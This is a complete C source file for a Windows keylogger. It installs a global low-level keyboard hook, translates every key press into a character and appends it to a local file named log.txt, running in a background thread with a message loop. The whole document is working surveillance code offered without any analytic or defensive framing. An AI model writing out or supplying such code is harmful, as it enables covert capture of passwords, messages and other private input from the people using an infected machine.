#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;
FILE* file = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            if (file != NULL) {
                if (p->vkCode == VK_RETURN) {
                    fprintf(file, "\n");
                }
                else {
                    SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
                    CHAR character;
                    BYTE keyboardState[256];

                    GetKeyboardState(keyboardState);
                    ToAscii(p->vkCode, p->scanCode, keyboardState, (LPWORD)&character, 0);

                    if (!(shiftState & 0x8000)) {
                        character = tolower(character);
                    }

                    fprintf(file, "%c", character);
                    fflush(file);
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

int main() {
    file = fopen("log.txt", "a+");
    if (file == NULL) {
        MessageBox(NULL, "Failed to open log file!", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);
    if (hThread == NULL) {
        MessageBox(NULL, "Failed to create thread!", "Error", MB_OK | MB_ICONERROR);
        fclose(file);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    fclose(file);
    return 0;
}
